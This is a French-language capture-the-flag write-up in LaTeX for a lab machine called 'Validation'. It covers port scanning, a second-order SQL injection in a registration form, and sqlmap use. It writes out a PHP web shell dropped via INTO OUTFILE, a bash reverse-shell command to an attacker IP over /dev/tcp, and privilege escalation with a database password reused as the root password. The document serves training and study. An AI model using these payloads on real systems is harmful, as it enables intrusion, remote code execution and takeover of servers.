\chapter{Validation}
\begin{itemize}
    \item {\bf technics}: second order sqli
    \item {\bf Components}: 
    \item {\bf tools}: 
\end{itemize}


\section{Résumé}


\section{Details}

\subsection{Recon}
\subsubsection{nmap}
\begin{verbatim}
TARGET_IP=10.10.11.116
$ PORTS=$( sudo nmap --min-rate=1000 -T4 -p- $TARGET_IP | grep '^[0-9]' | 
    cut -d'/' -f 1 | tr '\n' ',' | sed s/',$'//)
$ echo $PORTS
22,80,4566,5000,5001,5002,5003,5004,5005,5006,5007,5008,8080

$ sudo nmap -sVC -p$PORTS $TARGET_IP

PORT     STATE    SERVICE        VERSION
22/tcp   open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)
|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)
|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)
80/tcp   open     http           Apache httpd 2.4.48 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.48 (Debian)
4566/tcp open     http           nginx
|_http-title: 403 Forbidden
5000/tcp filtered upnp
5001/tcp filtered commplex-link
5002/tcp filtered rfe
5003/tcp filtered filemaker
5004/tcp filtered avt-profile-1
5005/tcp filtered avt-profile-2
5006/tcp filtered wsm-server
5007/tcp filtered wsm-server-ssl
5008/tcp filtered synapsis-edge
8080/tcp open     http           nginx
|_http-title: 502 Bad Gateway
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
\end{verbatim}

\subsubsection{http / 80}

fonctionnement:
\begin{itemize}
    \item on cree un compte et il retourne un cookie avec redirection vers
        \verb+account.php+
    \item on peut valider que le cookie est un md5 du username.
\end{itemize}

les differentes injection genre SSTI et sqlmap echouent même avec la
redirection. C'est peut être normal pour sqlmap.

en testant à la main avec burp en envoyant :
\begin{verbatim}
username=aaaa&country=Brazil'
\end{verbatim}
on obtient \verb+302 Found+ et en suivant la redirection:
\begin{verbatim}
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() 
on bool in /var/www/html/account.php:33
Stack trace:
#0 {main}
  thrown in <b>/var/www/html/account.php</b> on line <b>33</b><br />
\end{verbatim}

Ok donc c'est du second order. On eestime que la requete est du genre

\verb+SELECT username FROM table WHERE country = '<input>';+

donc on test avec :
\begin{verbatim}
username=aaaa&country=Brazil' union SELECT SLEEP(60) -- -
\end{verbatim}

et c'est bon.

\begin{verbatim}
username=aaaa&country=Brazil' union SELECT @@version  -- -

<h3 class="text-white">Other Players In Brazil' union SELECT @@version  -- -</h3>
<li class='text-white'>10.5.11-MariaDB-1</li>

...' union SELECT group_concat( schema_name ) FROM information_schema.schemata  -- -
information_schema,performance_schema,mysql,registration

union SELECT group_concat( table_name ) FROM information_schema.tables WHERE table_schema='registration'
registration

union SELECT group_concat( column_name ) FROM information_schema.columns WHERE table_name='registration'
username,userhash,country,regtime

union SELECT user()
uhc@localhost

union SELECT concat ( grantee, ' ', privilege_type) from information_schema.user_privileges
'uhc'@'localhost' FILE
\end{verbatim}

au fait sqlmap marche avec le second order vu que le token est constant pour le
compte créé.

\begin{verbatim}
sqlmap -r /tmp/register.req --second-req /tmp/account.req

---
Parameter: #1* ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=aaaa&country=Brazil' AND (SELECT 5121 FROM (SELECT(SLEEP(5)))OFHs) AND 'Agkf'='Agkf

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: username=aaaa&country=Brazil' UNION ALL SELECT CONCAT(0x716a6a6b71,0x4d65446e667973534d4947664743434a514668516443786745726b6b4a61664a4b4b7161484d5373,0x7176766b71)-- -
---
sqlmap -r /tmp/register.req --second-req /tmp/account.req --os-shell

\end{verbatim}

on essaie à la main car il pourrait ne pas detecter le success
\begin{verbatim}
' union select "<?php SYSTEM($_REQUEST['cmd']); ?>" into outfile '/var/www/html/cmd.php' -- -

http://10.10.11.116/cmd.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ curl 10.10.11.116/cmd.php \
--data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.16.5/4444 0>&1"'
Listening on 0.0.0.0 4444
Connection received on 10.10.11.116 42488
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@validation:/var/www/html$

\end{verbatim}

\subsection{Foothold}
\subsubsection{www-data}
\begin{verbatim}
www-data@validation:/var/www/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@validation:/var/www/html$
[1]+  Stopped                 rlwrap nc -lnvp 4444
$ stty raw -echo; fG
rlwrap nc -lnvp 4444

www-data@validation:/var/www/html$ cat config.php
cat config.php
<?php
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-9qual-global-pw";
  $dbname = "registration";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>

\end{verbatim}

on ne peut pas se logger avec par contre

\begin{verbatim}
www-data@validation:/var/www/html$ su -
su -
Password: uhc-9qual-global-pw
\end{verbatim}

\section{Theorie}


